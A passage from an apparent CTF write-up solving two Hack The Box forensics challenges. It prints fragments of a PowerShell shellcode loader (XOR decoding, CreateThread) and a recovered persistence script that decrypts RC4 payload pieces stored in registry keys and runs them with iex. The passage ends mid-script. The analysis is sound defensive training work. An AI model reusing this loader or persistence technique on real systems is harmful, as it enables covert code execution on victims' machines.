class="variable">$HVOASfFuNSxRXR</span>,<span class="number">0</span>,<span class="variable">$hRffYLENA</span>,<span class="variable">$HVOASfFuNSxRXR</span>.Length);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Unpack Shellcode;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$HVOASfFuNSxRXR</span>.count ; <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$HVOASfFuNSxRXR</span>[<span class="variable">$i</span>] = <span class="variable">$HVOASfFuNSxRXR</span>[<span class="variable">$i</span>] <span class="operator">-bxor</span> <span class="number">0</span>xd1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#Unpack Special Orders!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$stage3</span>.count;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$stage3</span>[<span class="variable">$i</span>] = <span class="variable">$stage3</span>[<span class="variable">$i</span>] <span class="operator">-bxor</span> <span class="number">0</span>xd1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tNZvQCljVk::CreateThread</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="variable">$hRffYLENA</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>Basically, it’s taking <code>stage1</code> and <code>stage2</code> </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">byte</span>[]] <span class="variable">$stage1</span> = <span class="number">0</span>x99, <span class="number">0</span>x85, <span class="number">0</span>x93, <span class="number">0</span>xaa, <span class="number">0</span>xb3, <span class="number">0</span>xe2, <span class="number">0</span>xa6, <span class="number">0</span>xb9, <span class="number">0</span>xe5, <span class="number">0</span>xa3, <span class="number">0</span>xe2, <span class="number">0</span>x8e, <span class="number">0</span>xe1, <span class="number">0</span>xb7, <span class="number">0</span>x8e, <span class="number">0</span>xa5, <span class="number">0</span>xb9, <span class="number">0</span>xe2, <span class="number">0</span>x8e, <span class="number">0</span>xb3;</span><br><span class="line">[<span class="built_in">byte</span>[]] <span class="variable">$stage2</span> = <span class="number">0</span>xac, <span class="number">0</span>xff, <span class="number">0</span>xff, <span class="number">0</span>xff, <span class="number">0</span>xe2, <span class="number">0</span>xb2, <span class="number">0</span>xe0, <span class="number">0</span>xa5, <span class="number">0</span>xa2, <span class="number">0</span>xa4, <span class="number">0</span>xbb, <span class="number">0</span>x8e, <span class="number">0</span>xb7, <span class="number">0</span>xe1, <span class="number">0</span>x8e, <span class="number">0</span>xe4, <span class="number">0</span>xa5, <span class="number">0</span>xe1, <span class="number">0</span>xe1;</span><br></pre></td></tr></table></figure>

<p>then reversing <code>stage2</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">array</span>]::Reverse(<span class="variable">$stage2</span>);</span><br></pre></td></tr></table></figure>

<p> and adding them in another variable called <code>stage3</code> </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stage3</span> = <span class="variable">$stage1</span> + <span class="variable">$stage2</span>;</span><br></pre></td></tr></table></figure>

<p>After that it’s looping through <code>stage3</code> and xoring with <code>0xd1</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$stage3</span>.count;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$stage3</span>[<span class="variable">$i</span>] = <span class="variable">$stage3</span>[<span class="variable">$i</span>] <span class="operator">-bxor</span> <span class="number">0</span>xd1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>I assumed that the flag is in the variable <code>stage3</code> so I edited the script a little bit by commenting some parts that we don’t actually need , finally, I printed the variable <code>stage3</code> .</p>
<p>This is the final script:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">byte</span>[]] <span class="variable">$stage1</span> = <span class="number">0</span>x99, <span class="number">0</span>x85, <span class="number">0</span>x93, <span class="number">0</span>xaa, <span class="number">0</span>xb3, <span class="number">0</span>xe2, <span class="number">0</span>xa6, <span class="number">0</span>xb9, <span class="number">0</span>xe5, <span class="number">0</span>xa3, <span class="number">0</span>xe2, <span class="number">0</span>x8e, <span class="number">0</span>xe1, <span class="number">0</span>xb7, <span class="number">0</span>x8e, <span class="number">0</span>xa5, <span class="number">0</span>xb9, <span class="number">0</span>xe2, <span class="number">0</span>x8e, <span class="number">0</span>xb3;</span><br><span class="line">[<span class="built_in">byte</span>[]] <span class="variable">$stage2</span> = <span class="number">0</span>xac, <span class="number">0</span>xff, <span class="number">0</span>xff, <span class="number">0</span>xff, <span class="number">0</span>xe2, <span class="number">0</span>xb2, <span class="number">0</span>xe0, <span class="number">0</span>xa5, <span class="number">0</span>xa2, <span class="number">0</span>xa4, <span class="number">0</span>xbb, <span class="number">0</span>x8e, <span class="number">0</span>xb7, <span class="number">0</span>xe1, <span class="number">0</span>x8e, <span class="number">0</span>xe4, <span class="number">0</span>xa5, <span class="number">0</span>xe1, <span class="number">0</span>xe1;</span><br><span class="line">[<span class="built_in">array</span>]::Reverse(<span class="variable">$stage2</span>);</span><br><span class="line"><span class="variable">$stage3</span> = <span class="variable">$stage1</span> + <span class="variable">$stage2</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$stage3</span>.count;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$stage3</span>[<span class="variable">$i</span>] = <span class="variable">$stage3</span>[<span class="variable">$i</span>] <span class="operator">-bxor</span> <span class="number">0</span>xd1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stage3</span></span><br></pre></td></tr></table></figure>

<p>After running the script using the command <code>pwsh</code> in linux (note that we can also run it in windows PowerShell) we get the following result.</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd081ae28-e4a4-4c68-bdfc-614df8a40ab4%2FUntitled.png?id=c9feb65a-71fb-4953-afa7-e08952c908f3&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1190&userId=&cache=v2" alt="forensics"></p>
<p>They are ascii values , I threw them into CyberChef and look what we have found!</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F254effab-931d-4273-8306-2633ac07b0b1%2FUntitled.png?id=e965daf5-28c7-4a15-b7ee-3d2debf52be3&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>We got our flag!</p>
<p><code>Flag : HTB&#123;b3wh4r3_0f_th3_b00t5_0f_just1c3...&#125;</code></p>
<hr>
<h2 id="Golden-Persistence"><a href="#Golden-Persistence" class="headerlink" title="Golden Persistence"></a>Golden Persistence</h2><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Emergency! A space station near Urkir was compromised. Although Urkir is considered to be the very embodiment of the neutral state, it is rich of fuel substances, something that Dreager is very much interested in. Thus, there are now fears that the intergalactic war will also affect this neutral planet. If Draeger and his mercenaries manage to maintain unauthorised access in Urkir&#x27;s space station and escalate their privileges, they will soon be able to activate the station&#x27;s defence mechanisms that are able to prevent any spaceship from entering Urkir&#x27;s airspace. For now, the infected machine is isolated until the case is closed. Help Miyuki find their persistence mechanisms so they cannot gain access again.</span><br></pre></td></tr></table></figure>

<p>We are given a NTUSER.DAT file </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Feb57080f-af83-4429-9c02-c630ce29b5ca%2FUntitled.png?id=ffcf33e0-a0c0-4e7b-a10a-00070f2c7897&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1240&userId=&cache=v2" alt="forensics"></p>
<p>In order to explore the file I used <code>regripper</code> tool in linux</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F27a78e3a-bb0f-42a8-b7b6-65dafcf2ff10%2FUntitled.png?id=b1cd6477-ff47-4472-8f48-d16f663c5859&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1110&userId=&cache=v2" alt="forensics"></p>
<p>we just need to give our <em>NTUSER.DAT</em> file and specify a name of a file to write the output in then for the plugin file option just choose <strong>ntuser-all.</strong> Finally, hit <strong>Rip it</strong></p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F792537d3-29c9-4a70-a8cf-62ace131b644%2FUntitled.png?id=73a8c3cf-ec80-4885-bf32-f40f8c3ff632&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1010&userId=&cache=v2" alt="forensics"></p>
<p>It will finish the process after some time , now if we take a look at our output.txt file we can see many data written to it.</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F4046bf19-1abd-4390-abcb-c6c160bc26ae%2FUntitled.png?id=0c70c9b5-2644-4d33-9451-e2d46daf05c2&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>Most of the data are not much of interest but if we scroll down we can find this line right here </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F83cc1139-d637-4b37-b8ad-aa154ef63a79%2FUntitled.png?id=e602a0cc-b72c-45cb-ba4e-07e8dc395228&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>there is a base64 encoded string after the <code>-enc</code> tag.</p>
<p>I saved it in another file and decoded it using the <code>base64 -d</code> command and saved the output in a file called <strong>decoded.txt</strong></p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb2583e4d-64e9-423a-8696-f9e268943fee%2FUntitled.png?id=35eb1505-5d53-448f-a18c-e80e2fd067bb&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1210&userId=&cache=v2" alt="forensics"></p>
<p>Let’s have a look at it</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Faa9d8ba5-9da3-45de-9638-54ff5d82876b%2FUntitled.png?id=c24f1057-c011-4844-af32-5171841f5281&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1600&userId=&cache=v2" alt="forensics"></p>
<p>It’s a PowerShell script so let’s rename it to <code>script.ps1</code> since the extension of a PowerShell script is <code>.ps1</code></p>
<p>This is the full script </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encr</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        [<span class="built_in">Byte</span>[]]<span class="variable">$data</span>,</span><br><span class="line">        [<span class="built_in">Byte</span>[]]<span class="variable">$key</span></span><br><span class="line">      )</span><br><span class="line"> </span><br><span class="line">    [<span class="built_in">Byte</span>[]]<span class="variable">$buffer</span> = <span class="built_in">New-Object</span> Byte[] <span class="variable">$data</span>.Length</span><br><span class="line">    <span class="variable">$data</span>.CopyTo(<span class="variable">$buffer</span>, <span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    [<span class="built_in">Byte</span>[]]<span class="variable">$s</span> = <span class="built_in">New-Object</span> Byte[] <span class="number">256</span>;</span><br><span class="line">    [<span class="built_in">Byte</span>[]]<span class="variable">$k</span> = <span class="built_in">New-Object</span> Byte[] <span class="number">256</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">256</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$i</span>] = [<span class="built_in">Byte</span>]<span class="variable">$i</span>;</span><br><span class="line">        <span class="variable">$k</span>[<span class="variable">$i</span>] = <span class="variable">$key</span>[<span class="variable">$i</span> % <span class="variable">$key</span><span class="type">.Length</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">256</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$s</span>[<span class="variable">$i</span>] + <span class="variable">$k</span>[<span class="variable">$i</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$s</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="variable">$s</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$j</span>] = <span class="variable">$temp</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$i</span> = <span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> <span class="operator">-lt</span> <span class="variable">$buffer</span>.Length; <span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$i</span> = (<span class="variable">$i</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$s</span>[<span class="variable">$i</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$s</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="variable">$s</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$j</span>] = <span class="variable">$temp</span>;</span><br><span class="line">        [<span class="built_in">int</span>]<span class="variable">$t</span> = (<span class="variable">$s</span>[<span class="variable">$i</span>] + <span class="variable">$s</span>[<span class="variable">$j</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$buffer</span>[<span class="variable">$x</span>] = <span class="variable">$buffer</span>[<span class="variable">$x</span>] <span class="operator">-bxor</span> <span class="variable">$s</span>[<span class="variable">$t</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$buffer</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HexToBin</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">    [<span class="type">Parameter</span>(</span><br><span class="line">        <span class="type">Position</span>=<span class="number">0</span>, </span><br><span class="line">        <span class="type">Mandatory</span>=<span class="variable">$true</span>, </span><br><span class="line">        <span class="type">ValueFromPipeline</span>=<span class="variable">$true</span>)</span><br><span class="line">    ]   </span><br><span class="line">    [<span class="built_in">string</span>]<span class="variable">$s</span>)</span><br><span class="line">    <span class="variable">$return</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$s</span>.Length ; <span class="variable">$i</span> += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$return</span> += [<span class="built_in">Byte</span>]::Parse(<span class="variable">$s</span>.Substring(<span class="variable">$i</span>, <span class="number">2</span>), [<span class="type">System.Globalization.NumberStyles</span>]::HexNumber)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">Write-Output</span> <span class="variable">$return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="built_in">Byte</span>[]]<span class="variable">$key</span> = <span class="variable">$enc</span>.GetBytes(<span class="string">&quot;Q0mmpr4B5rvZi3pS&quot;</span>)</span><br><span class="line"><span class="variable">$encrypted1</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL</span><br><span class="line"><span class="variable">$encrypted2</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> HKCU:\SOFTWARE\BjqAtIen).uLltjjW</span><br><span class="line"><span class="variable">$encrypted3</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da</span><br><span class="line"><span class="variable">$encrypted4</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl</span><br><span class="line"><span class="variable">$encrypted5</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> HKCU:\AppEvents\Jx66ZG0O).jH54NW8C</span><br><span class="line"><span class="variable">$encrypted</span> = <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$encrypted1</span>)<span class="variable">$</span>(<span class="variable">$encrypted2</span>)<span class="variable">$</span>(<span class="variable">$encrypted3</span>)<span class="variable">$</span>(<span class="variable">$encrypted4</span>)<span class="variable">$</span>(<span class="variable">$encrypted5</span>)&quot;</span></span><br><span class="line"><span class="variable">$enc</span> = [<span class="type">System.Text.Encoding</span>]::ASCII</span><br><span class="line">[<span class="built_in">Byte</span>[]]<span class="variable">$data</span> = HexToBin <span class="variable">$encrypted</span></span><br><span class="line"><span class="variable">$DecryptedBytes</span> = encr <span class="variable">$data</span> <span class="variable">$key</span></span><br><span class="line"><span class="variable">$DecryptedString</span> = <span class="variable">$enc</span>.GetString(<span class="variable">$DecryptedBytes</span>)</span><br><span class="line"><span class="variable">$DecryptedString</span>|<span class="built_in">iex</span></span><br></pre></td></tr></table></figure>

<p>It’s basically doing an encryption of 5 strings with the key <code>Q0mmpr4B5rvZi3pS</code> . The encrypted strings are in the variables <code>$encrypted1</code> —&gt; <code>$encrypted5</code> but If you notice, the actual value of the strings is not in the script it’s only showing the path of it like <code>Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s</code> for example. So all we have to do is to grab the real value of the encrypted string from each registry key. To do so I used a tool called <code>regshell</code></p>
<p>We can do <code>regshell -F NTUSER.DAT</code> and it will give us a shell that we can go through using normal commands like <code>ls</code>, <code>cd</code> and <code>cat</code> </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F45711d94-eb86-41fb-b443-82a24ce32b9c%2FUntitled.png?id=47a99333-f7f9-44b2-acda-845bab11076f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1260&userId=&cache=v2" alt="forensics"></p>
<p>Let’s go to every registry key mentioned in the script and grab the encrypted string each time then change it in the script.</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc5da22fc-3b48-4166-b8b6-39e7d0440747%2FUntitled.png?id=a0864a50-767f-4126-a25f-ef82507b4a4a&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>After doing the same thing to all the paths we can rebuild our script </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encr</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        [<span class="built_in">Byte</span>[]]<span class="variable">$data</span>,</span><br><span class="line">        [<span class="built_in">Byte</span>[]]<span class="variable">$key</span></span><br><span class="line">      )</span><br><span class="line"> </span><br><span class="line">    [<span class="built_in">Byte</span>[]]<span class="variable">$buffer</span> = <span class="built_in">New-Object</span> Byte[] <span class="variable">$data</span>.Length</span><br><span class="line">    <span class="variable">$data</span>.CopyTo(<span class="variable">$buffer</span>, <span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    [<span class="built_in">Byte</span>[]]<span class="variable">$s</span> = <span class="built_in">New-Object</span> Byte[] <span class="number">256</span>;</span><br><span class="line">    [<span class="built_in">Byte</span>[]]<span class="variable">$k</span> = <span class="built_in">New-Object</span> Byte[] <span class="number">256</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">256</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$i</span>] = [<span class="built_in">Byte</span>]<span class="variable">$i</span>;</span><br><span class="line">        <span class="variable">$k</span>[<span class="variable">$i</span>] = <span class="variable">$key</span>[<span class="variable">$i</span> % <span class="variable">$key</span><span class="type">.Length</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">256</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$s</span>[<span class="variable">$i</span>] + <span class="variable">$k</span>[<span class="variable">$i</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$s</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="variable">$s</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$j</span>] = <span class="variable">$temp</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$i</span> = <span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> <span class="operator">-lt</span> <span class="variable">$buffer</span>.Length; <span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$i</span> = (<span class="variable">$i</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$s</span>[<span class="variable">$i</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$s</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="variable">$s</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$j</span>] = <span class="variable">$temp</span>;</span><br><span class="line">        [<span class="built_in">int</span>]<span class="variable">$t</span> = (<span class="variable">$s</span>[<span class="variable">$i</span>] + <span class="variable">$s</span>[<span class="variable">$j</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$buffer</span>[<span class="variable">$x</span>] = <span class="variable">$buffer</span>[<span class="variable">$x</span>] <span class="operator">-bxor</span> <span class="variable">$s</span>[<span class="variable">$t</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$buffer</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HexToBin</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">    [<span class="type">Parameter</span>(</span><br><span class="line">        <span class="type">Position</span>=<span class="number">0</span>, </span><br><span class="line">        <span class="type">Mandatory</span>=<span class="variable">$true</span>, </span><br><span class="line">        <span class="type">ValueFromPipeline</span>=<span class="variable">$true</span>)</span><br><span class="line">    ]   </span><br><span class="line">    [<span class="built_in">string</span>]<span class="variable">$s</span>)</span><br><span class="line">    <span class="variable">$return</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$s</span>.Length ; <span class="variable">$i</span> += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$return</span> += [<span class="built_in">Byte</span>]::Parse(<span class="variable">$s</span>.Substring(<span class="variable">$i</span>, <span class="number">2</span>), [<span class="type">System.Globalization.NumberStyles</span>]::HexNumber)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">Write-Output</span> <span class="variable">$return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="built_in">Byte</span>[]]<span class="variable">$key</span> = <span class="variable">$enc</span>.GetBytes(<span class="string">&quot;Q0mmpr4B5rvZi3pS&quot;</span>)</span><br><span class="line"><span class="variable">$encrypted1</span> = <span class="string">&quot;F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39&quot;</span> <span class="comment">#(Get-ItemProperty -Path 